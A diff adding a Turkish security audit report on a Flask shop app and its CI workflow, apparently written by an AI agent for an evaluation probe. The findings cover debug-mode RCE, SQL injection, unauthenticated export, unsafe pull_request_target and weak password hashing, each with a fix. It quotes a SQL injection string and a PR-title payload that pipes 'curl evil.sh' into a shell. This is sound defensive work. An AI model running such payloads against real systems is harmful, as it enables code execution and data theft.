@@ -1,0 +1,63 @@
+[probe p12]
+# Yayın Öncesi Güvenlik Denetimi
+
+Kapsam: `app.py`, `requirements.txt`, `.github/workflows/ci.yml`. Kodu değiştirmedim. Hiçbir bulguyu çalıştırarak doğrulamadım, hepsi kodu okuyarak çıkarıldı.
+
+**Sonuç: Bu haliyle yayına alınmamalı.** 4 kritik, 2 yüksek, 2 orta bulgu var.
+
+## Kritik
+
+**1. Debug modu açık ve tüm arayüzlere dinliyor** (`app.py:40`)
+- `debug=True` ile `host="0.0.0.0"` birlikte, Werkzeug etkileşimli hata ayıklayıcısını ağa açar. Bir hata sayfası tetiklenirse sunucuda uzaktan kod çalıştırılabilir (RCE).
+- Çözüm: `debug=False` yapın. Üretimde `app.run` yerine gunicorn gibi bir WSGI sunucusu kullanın. Ters vekilin arkasında `127.0.0.1`'e bağlayın.
+
+**2. SQL enjeksiyonu** (`app.py:28`, `/orders`)
+- `customer` parametresi f-string ile sorguya ekleniyor. `?customer=' OR '1'='1` tüm siparişleri döker. `UNION SELECT` ile `users` tablosundaki parola özetleri de çekilebilir.
+- Çözüm: `conn.execute("SELECT id, total FROM orders WHERE customer = ?", (customer,))`.
+- Kimlik doğrulama da yok. Herhangi biri başka bir müşterinin siparişlerini adını yazarak görebilir (IDOR).
+
+**3. `/admin/export` kimlik doğrulamasız** (`app.py:32-36`)
+- Tüm `users` tablosunu (ad ve parola özeti) herkese açık döner.
+- Çözüm: Kimlik doğrulama ve yetkilendirme ekleyin. Parola alanını hiç döndürmeyin. Bu uç noktayı kaldırmak da bir seçenek.
+
+**4. CI: `pull_request_target` ile PR'ın kodunu çalıştırma** (`ci.yml:3,12,14`)
+- `pull_request_target`, depo sırlarına ve yazma yetkili `GITHUB_TOKEN`'a erişimle çalışır. Aynı iş akışı PR'ın head SHA'sını çekip `pip install -r requirements.txt` ve `pytest` çalıştırıyor. Fork'tan açılan bir PR, `requirements.txt` veya testler üzerinden keyfi kod çalıştırıp sırları çalabilir.
+- Çözüm: `pull_request` tetikleyicisini kullanın. `pull_request_target` gerekiyorsa güvenilmeyen kodu çekip çalıştırmayın. İzinleri `permissions: contents: read` ile kısıtlayın.
+
+## Yüksek
+
+**5. Parolalar MD5 ile, tuzsuz saklanıyor** (`app.py:18`)
+- MD5 hızlıdır ve tuz yoktur. Veritabanı sızarsa (bulgu 2 ve 3 bunu kolaylaştırıyor) parolalar gökkuşağı tablolarıyla hemen kırılır.
+- Çözüm: `werkzeug.security.generate_password_hash` (scrypt/pbkdf2) veya argon2/bcrypt kullanın. Mevcut kayıtlar için yeniden hash'leme planı yapın.
+
+**6. Sabit ve tahmin edilebilir `SECRET_KEY`** (`app.py:7`)
+- `"change-me-secret-key"` kaynak kodda ve git geçmişinde duruyor. Oturum çerezi kullanılırsa sahteleme mümkün olur. Bu anahtarı sızmış sayın.
+- Çözüm: Anahtarı ortam değişkeninden veya gizli yönetiminden okuyun ve yeni bir değer üretin.
+
+## Orta
+
+**7. Kayıt uç noktasında doğrulama ve hata yönetimi yok** (`app.py:15-21`)
+- `request.form["name"]` eksikse 400 döner. `users` tablosu yoksa veya ad çakışırsa işlenmeyen istisna oluşur. Bu da debug kapalı olsa bile bilgi sızdırabilir.
+- Parola uzunluğu/karmaşıklığı denetlenmiyor. Hız sınırlaması (rate limiting) yok, bu yüzden kaba kuvvet ve kayıt spam'i mümkün.
+- Çözüm: Girdileri doğrulayın, benzersizlik kısıtı ekleyin, hata yakalayın ve hız sınırı uygulayın (ör. Flask-Limiter).
+
+**8. Aktarım ve tarayıcı güvenliği eksik**
+- HTTPS zorlaması, güvenlik başlıkları (HSTS, `X-Content-Type-Options` vb.) ve CSRF koruması yok. `/register` form tabanlı olduğu için CSRF'e açık.
+- Çözüm: TLS'i ters vekilde sonlandırın, başlıkları ekleyin (ör. Flask-Talisman), gerekli yerlerde CSRF belirteci kullanın.
+
+## Düşük / Bilgi
+
+- `requirements.txt` sadece `Flask>=3.1.3` içeriyor. Sürümler sabitlenmemiş, kilit dosyası yok, bu da yeniden üretilebilir olmayan derlemelere yol açar. Çözüm: `pip-compile` veya `pip freeze` ile sabitleyin, hash'ler ekleyin.
+- `shop.db` dosyası göreli yolda ve tablo oluşturma/migrasyon kodu yok. Üretimde dosya konumu ve izinlerini belirleyin (ya da gerçek bir veritabanı kullanın).
+- `ci.yml` içinde `${{ github.event.pull_request.title }}` doğrudan `run:` komutuna enjekte ediliyor. Bu da betik enjeksiyonudur: başlığa `"; curl evil.sh | sh #` yazan bir PR komut çalıştırır. Bulgu 4 ile birlikte düşünüldüğünde ek bir saldırı yolu. Çözüm: değeri `env:` üzerinden geçirin.
+- Ayrı bir not: `actions/checkout@v4` etiketle sabitlenmiş. Tam commit SHA'sıyla sabitlemek daha güvenlidir.
+- Depoda test dosyası yok, `pytest` CI'da çalışacak bir şey bulamayabilir.
+
+## Önerilen sıra
+
+1. Debug'ı kapatın (1), SQL enjeksiyonunu düzeltin (2) ve `/admin/export`'u korumaya alın ya da kaldırın (3).
+2. CI iş akışını düzeltin (4 ve başlık enjeksiyonu).
+3. Parola hash'ini değiştirin (5) ve `SECRET_KEY`'i yenileyin (6).
+4. Sonra orta ve düşük maddelere geçin.
+
+Not: Git geçmişinde yalnızca tek bir commit (`dd79e81`) var. Başka dosya ya da sır görmedim, ancak geçmişi komutla taramadım (Bash devre dışı).
